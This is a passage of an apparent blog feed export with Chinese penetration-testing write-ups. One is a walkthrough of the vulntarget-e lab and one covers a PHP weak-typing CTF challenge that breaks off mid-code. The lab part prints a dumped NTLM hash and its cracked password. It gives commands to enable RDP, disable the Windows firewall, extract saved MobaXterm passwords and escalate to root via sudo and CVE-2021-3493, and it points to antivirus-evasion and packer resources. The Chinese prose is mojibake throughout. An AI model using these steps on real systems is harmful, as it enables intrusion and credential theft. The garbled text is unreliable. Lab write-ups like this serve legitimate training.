plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msv :</span><br><span class="line"> [00000005] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : WIN-JJJBQ4N87RA</span><br><span class="line"> * NTLM     : dfc8d2bfa540a0a6e2248a82322e654e</span><br><span class="line"> * SHA1     : cfa10f59337120a5ea6882b11c1c9f451f5f4ea6</span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>dfc8d2bfa540a0a6e2248a82322e654e<br>ntlm<br>Admin#123</p><p>md5ç½‘ç«™è§£ä¸€ä¸‹å°±æœ‰äº†ï¼Œ</p><p>æˆ‘ä»¬åœ¨ä¸Šä¸ªfscanæ‰«ä¸‹ä¸‹ä¸ªç½‘æ®µï¼Œä¸Šä¸ªwinçš„ï¼Œè¿™é‡Œä¸Šä¼ ä¸Šå»ç›´æ¥æŠ¥æ¯’äº†ï¼Œç„¶åæ€æ‰äº†</p><p><img src="/images/vulntarget-e/image-20221130201732733.png" alt="image-20221130201732733"></p><p>æ²¡å…³ç³»ï¼Œæœ‰ä¸ªå¸ˆå‚…äºŒå¼€äº†fscançš„ï¼Œ<code>https://github.com/h0nayuzu/Fscan_BaihuaSec/releases</code>æˆ‘ä»¬å»è¯•ä¸€ä¸‹ï¼Œ</p><p>è¿™ä¸ªæ–‡ä»¶æœ‰ç‚¹å¤§ï¼Œ20å¤šmï¼Œèšå‰‘è¶…æ—¶çš„è¯å°±ä¸Šä¼ å¤±è´¥äº†ï¼Œæˆ‘ä»¬æ”¹ä¸€ä¸‹è¶…æ—¶æ—¶é—´ï¼Œæ”¹å¤§ç‚¹</p><p><img src="/images/vulntarget-e/image-20221130202142743.png" alt="image-20221130202142743"></p><p>ç¬”è€…åœ¨è¿™é‡Œä¸Šä¼ æˆåŠŸäº†ï¼Œä½†æ˜¯ä¸èƒ½ç”¨ï¼Œç¬”è€…åˆä¼ äº†ä¸€éï¼Œè¿™æ ·çš„è¯ä¸‰æ¬¡äº†ï¼Œå…¨éƒ¨å åŠ äº†ä¸€èµ·å¹¶æ²¡æœ‰è¦†ç›–ï¼Œæˆ‘ä»¬ä»æ–°æ”¹ä¸ªåå­—ä¼ ï¼Œæˆ–è€…åˆ äº†åˆä¼ äº†å‡ éï¼Œè¿˜æ˜¯æ²¡æˆåŠŸï¼Œå¯èƒ½æ˜¯ä»£ç†çš„é—®é¢˜ï¼Œæ–‡ä»¶æœ‰ç‚¹å¤§ï¼Œä½œè€…è¯´äº†ï¼Œè¿™é‡Œæ‰“åŒ…å‡ºæ¥çš„fscanå°±æ˜¯è¿™ä¹ˆå¤§æ²¡æœ‰å‹ç¼©ï¼Œå¯ä»¥è‡ªå·±å‹ç¼©ï¼Œupxå‹ä¸€ä¸‹ï¼Œæˆ–è€…ä¸Šé¢é‚£ä¸ªå·¥å…·ï¼Œæˆ‘ä»¬è¯•ä¸‹godzillaå¤§æ–‡ä»¶ä¸Šä¼ </p><p><img src="/images/vulntarget-e/image-20221130202622434.png" alt="image-20221130202622434"></p><p><img src="/images/vulntarget-e/image-20221130202834288.png" alt="image-20221130202834288"></p><p>è¿™é‡Œå°tipï¼Œå“¥æ–¯æ‹‰æ˜¯å¯ä»¥è¿æ¥ä¸€å¥è¯çš„ã€‚æ‰€ä»¥ç›´æ¥è¿å°±è¡Œ</p><p><img src="/images/vulntarget-e/image-20221130204635575.png" alt="image-20221130204635575"></p><p>è¿™é‡Œå“¥æ–¯æ‹‰ä¼ ä¸Šæ¥æ²¡æœ‰é—®é¢˜ï¼Œå›¾æ²¡æˆª</p><p><img src="/images/vulntarget-e/image-20221130205528351.png" alt="image-20221130205528351"></p><p>.\fscan_win_amd64.exe -h 10.0.10.0/24 -o r.txt</p><p><img src="/images/vulntarget-e/image-20221130205706916.png" alt="image-20221130205706916"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ª20çš„æ®µ 110çš„ipåªå¼€äº†22ç«¯å£ï¼Œæ˜¾ç„¶æ˜¯å°linuxäº†ï¼Œä¼°è®¡åˆæ˜¯å¼±å£ä»¤ï¼Œæˆ–è€…æ¼æ´äº†ã€‚</p><p>æ­£å¸¸æ€è·¯æ˜¯ä¸Šewï¼Œç„¶åæ‰“åä¸€ä¸ªç½‘ç«¯ï¼Œä½†æ˜¯è¿™é‡Œä¸æ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬è¦è·å–è¿œç¨‹æ¡Œé¢ï¼Œå¼€ä¸‹3389å…¶å®è¿™æ ·åšåœ¨å®æˆ˜ä¸­æ˜¯éå¸¸å±é™©çš„ï¼Œå®¹æ˜“è¢«å‘ç°ã€‚ä¸è¿‡è¿™é‡Œè¿˜æ˜¯å…ˆè¦è¿™æ ·æ“ä½œã€‚</p><p>æˆ‘ä»¬å…ˆcmdæŠŠ3389å¼€äº†<code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p><p><img src="/images/vulntarget-e/image-20221130210751420.png" alt="image-20221130210751420"></p><p>æ‰“å¼€ä¹‹åç›´æ¥ç™»å½•å°±è¡Œäº†ï¼Œadministrator/Admin#123</p><p><img src="/images/vulntarget-e/image-20221130210947108.png" alt="image-20221130210947108"></p><p>å“¦å¯¹äº†ï¼Œå…¶å®è¿˜æ˜¯è¿ä¸ä¸Šï¼Œé˜²ç«å¢™å¼€ç€ï¼Œæˆ‘ä»¬å†æŠŠé˜²ç«å¢™å…³äº†</p><p><code>netsh advfirewall set allprofiles state off</code>\</p><p><img src="/images/vulntarget-e/image-20221130211126227.png" alt="image-20221130211126227"></p><p>å°±è¿ä¸Šæ¥äº†</p><p><img src="/images/vulntarget-e/image-20221130211216240.png" alt="image-20221130211216240"></p><p>ä¸‹é¢æœ‰ä¸€ä¸ªmobaï¼Œæˆ‘ä»¬æ‰“å¼€æ˜¯è¦å¯†ç çš„ï¼Œç„¶åè¾“ä¸€ä¸‹åˆšåˆšadministratorçš„å¯†ç ï¼Œä¸Šé¢flagè¯´äº†,å¯†ç ä¼šç”¨åˆ°å…¶ä»–åœ°æ–¹ï¼Œ</p><p><img src="/images/vulntarget-e/image-20221130211247112.png" alt="image-20221130211247112"></p><h3 id="mobaåˆ©ç”¨ã€cve-2021-3493"><a href="#mobaåˆ©ç”¨ã€cve-2021-3493" class="headerlink" title="mobaåˆ©ç”¨ã€cve_2021_3493"></a>mobaåˆ©ç”¨ã€cve_2021_3493</h3><h4 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h4><p>ç›´æ¥å°±å¯ä»¥è¿ä¸Šæ¥ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªvulntargetçš„æ™®é€šç”¨æˆ·ï¼Œé‚£è‚¯å®šæ˜¯æƒ³åŠæ³•ææƒï¼Œä¸Šlseç­‰ç­‰ï¼Œè¿™è¾¹ç¬”è€…æä¾›ä¸¤ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯é¢„æœŸè§£å’Œä¸€ä¸ªéé¢„æœŸè§£ï¼Œéé¢„æœŸè§£æ˜¯ä¸€ä¸ªç®€å•çš„ææƒæ–¹æ³•ï¼Œæœ‰å¾ˆå¤šæœºå™¨å¦‚æœä½ æœ‰äº†ä¸€ä¸ªæ™®é€šçš„å¯ä»¥ç™»å½•çš„è´¦æˆ·å¯ä»¥è¯•è¯•è¿™ä¸ªï¼Œå±¡è¯•ä¸çˆ½ã€‚sudoæ¼æ´</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">è¾“å…¥è¿™ä¸ªç”¨æˆ·çš„å¯†ç </span><br><span class="line">ï¼</span><br><span class="line">å‡ºå»å°±æ˜¯rootäº†</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221130211440233.png" alt="image-20221130211440233"></p><p>ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“vulntargetçš„å¯†ç ï¼Œå› ä¸ºä¸Šé¢è¿›æ¥çš„æ—¶å€™æ˜¯è¾“å…¥çš„mobaçš„å®‰å…¨å¯†ç ï¼Œå¹¶ä¸æ˜¯sshçš„å¯†ç ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯å¯ä»¥çœ‹åˆ°çš„ï¼Œä¾æ¬¡ç‚¹å‡»settings-&gt;configuration-&gt;mobapasswords-&gt;show passs-&gt;è¿™ä¸ªpasså°±æ˜¯mobaçš„å®‰å…¨å¯†ç ï¼Œ</p><p><img src="/images/vulntarget-e/image-20221130212059351.png" alt="image-20221130212059351"></p><p><img src="/images/vulntarget-e/image-20221130212240621.png" alt="image-20221130212240621"></p><p>å³é¢å°±ä¼šæ˜¾ç¤ºå¯†ç äº†ï¼Œvuln@qweå¥½æ¥ä¸‹æ¥sudoææƒ</p><p>sudo man man</p><p>vuln@qwe</p><p>!</p><p>å›è½¦</p><p><img src="/images/vulntarget-e/image-20221130212542320.png" alt="image-20221130212542320"></p><p><img src="/images/vulntarget-e/image-20221130212417710.png" alt="image-20221130212417710"></p><p><img src="/images/vulntarget-e/image-20221130212706685.png" alt="image-20221130212706685"></p><p>è‡³æ­¤å°±æ‹¿ä¸‹äº†æœ€åä¸€å°é¶æœºï¼Œrootä¸‹æœ‰ä¸ªflagï¼Œ<code>find /* -name &quot;*flag*&quot;</code></p><p><img src="/images/vulntarget-e/image-20221130213029531.png" alt="image-20221130213029531"></p><p>ç…ä¸€çœ¼ï¼Œ</p><p>root@ubuntu:~# cat /root/flag<br>Congratulations on winning the final flag</p><p>vulntarget{cve_2021_3493_local_privilege_promotion_overlayfs}</p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª2021_3493,æ˜¯é‚£ä¸ªææƒæ¼æ´ã€‚</p><p>ç¬”è€…è¿™é‡Œè·‘äº†ä¸€ä¸‹rootå¯†ç ï¼Œæ²¡å‡ºï¼Œemmmmm</p><p><img src="/images/vulntarget-e/image-20221130220156785.png" alt="image-20221130220156785"></p><h4 id="ä»¥ä¸Šå°±æ˜¯éé¢„æœŸè§£ï¼Œä¸‹é¢æ˜¯é¢„æœŸè§£"><a href="#ä»¥ä¸Šå°±æ˜¯éé¢„æœŸè§£ï¼Œä¸‹é¢æ˜¯é¢„æœŸè§£" class="headerlink" title="ä»¥ä¸Šå°±æ˜¯éé¢„æœŸè§£ï¼Œä¸‹é¢æ˜¯é¢„æœŸè§£"></a>ä»¥ä¸Šå°±æ˜¯éé¢„æœŸè§£ï¼Œä¸‹é¢æ˜¯é¢„æœŸè§£</h4><p><code>git clone https://github.com/briskets/CVE-2021-3493</code></p><p>cdè¿›å»</p><p>æ‰¾ä¸€å°ubuntuå»å…‹éš†ä¸€ä¸‹è¿™ä¸ªexpé¡¹ç›®ï¼Œè¿™é‡Œæ³¨æ„è‹¥æ˜¯åœ¨kaliä¸Šç¼–è¯‘ï¼Œæ‹¿å‡ºæ¥å»ç›®æ ‡æœºä¸Šæ‰§è¡Œä¼šæŠ¥é”™ï¼Œæ‰¾ä¸åˆ°soæ–‡ä»¶ã€‚</p><p><code>gcc exploit.c -o exploit</code> </p><p>ç¼–è¯‘ä¸€ä¸‹ï¼Œæ‹–å‡ºæ¥åˆ°ç›®æ ‡æœºä¸Šï¼Œè¿™é‡Œæ‹–åˆ°winä¸Šä¼šæŠ¥æ¯’ï¼Œæˆ‘è¿™é‡Œç›´æ¥æŠŠdfå…³æ‰å§ï¼Œå¦‚æœä¸æƒ³å…³äº†ï¼Œå°±æ‰“ä¸ªtaråŒ…ï¼Œåˆ°ç›®æ ‡æœºä¸Šåœ¨è§£å‹ï¼Œrdpä¸èƒ½æ‹–çš„è¯ï¼Œå¯ä»¥å¤åˆ¶ç²˜è´´ï¼Œ</p><p><img src="/images/vulntarget-e/image-20221130215219417.png" alt="image-20221130215219417"></p><p>è¿™æ ·ä¹Ÿæ‹¿ä¸‹äº†è¿™å°æœºå™¨ã€‚è‡³æ­¤æ•´ä¸ªé¶åœºå°±æ‰“å®Œäº†ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p>å‚è€ƒæ–‡ç« </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/crow821/vulntarget <span class="comment">#é¶åœºå®˜æ–¹åœ°å€</span></span><br><span class="line">https://mp.weixin.qq.com/s/cisoqDnsHqyzCFdx-eG5TQ <span class="comment">#ä½œè€…çš„æ­å»ºä¸æ‰“é¶è®°å½•</span></span><br><span class="line">https://www.freebuf.com/articles/web/333566.html <span class="comment">#vulntargetæ¼æ´é¶åœºç³»åˆ—ï¼ˆä¸‰ï¼‰ï¼švulntarget-c</span></span><br><span class="line">https://cloud.tencent.com/developer/article/1171183 <span class="comment">#ä¹ç§å§¿åŠ¿è¿è¡ŒMimikatz</span></span><br><span class="line">https://www.freebuf.com/news/234365.html <span class="comment">#Mimikatzçš„18ç§å…æ€å§¿åŠ¿åŠé˜²å¾¡ç­–ç•¥</span></span><br><span class="line">https://www.freebuf.com/vuls/280508.html <span class="comment">#Laravel RCEï¼ˆCVE-2021-3129ï¼‰æ¼æ´å¤ç°</span></span><br></pre></td></tr></table></figure><p>ç”¨åˆ°å·¥å…·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VMProtect Ultimate 3.4.0åŠ å£³è½¯ä»¶</span><br><span class="line">https://pan.baidu.com/s/1VXaZgZ1YlVQW9P3B_ciChg æå–ç : emnq</span><br><span class="line">æ­¤ç™¾åº¦ç½‘ç›˜åŸé“¾åœ¨`https://www.freebuf.com/news/234365.html`ä¸­</span><br><span class="line"></span><br><span class="line">äºŒå¼€fscan</span><br><span class="line">https://github.com/h0nayuzu/Fscan_BaihuaSec/releases</span><br></pre></td></tr></table></figure><h3 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h3><blockquote><p>å› ä¸ºä¸ªäººèƒ½åŠ›æœ‰é™ï¼Œæ–‡ç« ä¸­è‹¥æœ‰é”™è¯¯ï¼Œæ•¬è¯·æ–§æ­£<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
            <tag> vulntarget-c </tag>
            
            <tag> laravel </tag>
            
            <tag> OVAS-PHPç›¸å…³æ¼æ´ </tag>
            
            <tag> éš§é“ä»£ç† </tag>
            
            <tag> å…æ€ </tag>
            
            <tag> ææƒ </tag>
            
            <tag> CVE-2021-3129 </tag>
            
            <tag> CVE-2021-3493 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äºŒå±ŠåŒ—äº¬å¤§å­¦ä¿¡æ¯å®‰å…¨ç»¼åˆèƒ½åŠ›ç«èµ›éƒ¨åˆ†wp</title>
      <link href="/2022/11/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/11/24/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%8C%97%E4%BA%AC%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BB%BC%E5%90%88%E8%83%BD%E5%8A%9B%E7%AB%9E%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20221124111931793.png" alt="image-20221124111931793"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2022å¹´å¤©æ´¥å¸‚å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç½‘ç»œæ”»é˜²å¤§èµ›éƒ¨åˆ†wp</title>
      <link href="/2022/09/29/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/09/29/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p>æœ¬æ¥æƒ³ä¸è®°å½•äº† ï¼Œä¹Ÿéƒ½æ˜¯ç½‘ä¸Šèƒ½æœåˆ°çš„é¢˜ï¼Œæœ€åæƒ³äº†ä¸€ä¸‹è¿˜æ˜¯è®°å½•ä¸€ä¸‹å§</p><h2 id="ç†è®ºé¢˜"><a href="#ç†è®ºé¢˜" class="headerlink" title="ç†è®ºé¢˜"></a>ç†è®ºé¢˜</h2><p>æ²¡å•¥æ„æ€</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="æœ€å¥½çš„è¯­è¨€"><a href="#æœ€å¥½çš„è¯­è¨€" class="headerlink" title="æœ€å¥½çš„è¯­è¨€"></a>æœ€å¥½çš„è¯­è¨€</h3><p>300pt (å·²åšå‡º) è€ƒç‚¹ is_number array_search() å¼±ç±»å‹æ¯”è¾ƒ<br>èµ›é¢˜åœ°å€<code>http://ctftime1.usaas.net/web/good/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$x1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>];</span><br><span class="line">        <span class="variable">$x1</span>==<span class="string">&quot;1&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$x1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x2</span>=(<span class="keyword">array</span>)json_decode(@<span class="variable">$_GET</span>[<span class="string">&#x27;x2&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$x2</span>))&#123;</span><br><span class="line">    is_numeric(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])&#123;</span><br><span class="line">        (<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>]&gt;<span class="number">2017</span>)?<span class="variable">$b</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(is_array(@<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">        <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;XIPU&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$c</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$x3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x3&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$x3</span> != <span class="string">&#x27;15562&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strstr(<span class="variable">$x3</span>, <span class="string">&#x27;XIPU&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(md5(<span class="variable">$x3</span>),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">&#x27;15562&#x27;</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span>=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> &amp;&amp; <span class="variable">$b</span> &amp;&amp; <span class="variable">$c</span> &amp;&amp; <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆæ¥çœ‹æœ€åä¸€æ®µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> &amp;&amp; <span class="variable">$b</span> &amp;&amp; <span class="variable">$c</span> &amp;&amp; <span class="variable">$d</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">è¿™é‡Œå­˜åœ¨åˆ¤æ–­ abcdéƒ½è¦ä¸º<span class="number">1</span>ä¹Ÿå°±æ˜¯<span class="literal">true</span>  æ‰å¯ä»¥<span class="keyword">echo</span> flag</span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="variable">$x1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x1&#x27;</span>];</span><br><span class="line">        <span class="variable">$x1</span>==<span class="string">&quot;1&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$x1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>getä¼ ä¸ªx1 å¹¶ä¸”  $x1==â€1â€?die(â€œha?â€):NULL;  ä¸‰ç›®è¿ç®—ç¬¦ï¼Œè¿™å¥æ„æ€æ˜¯å¦ä¸º1  ä¸º1åˆ™die<br>é‚£æˆ‘ä»¬ä¸ºx1 ä¸º0  switch ä¼šå…ˆç»è¿‡0  æ²¡æœ‰break  æ¥ç€ä¼šcase1 è¿™æ ·  a=1äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$x2</span>=(<span class="keyword">array</span>)json_decode(@<span class="variable">$_GET</span>[<span class="string">&#x27;x2&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$x2</span>))&#123;</span><br><span class="line">    is_numeric(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>])&#123;</span><br><span class="line">        (<span class="variable">$x2</span>[<span class="string">&quot;x21&quot;</span>]&gt;<span class="number">2017</span>)?<span class="variable">$b</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(is_array(@<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array(<span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span> = array_search(<span class="string">&quot;XIPU&quot;</span>, <span class="variable">$x2</span>[<span class="string">&quot;x22&quot;</span>]);</span><br><span class="line">        <span class="variable">$p</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;ha?&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span 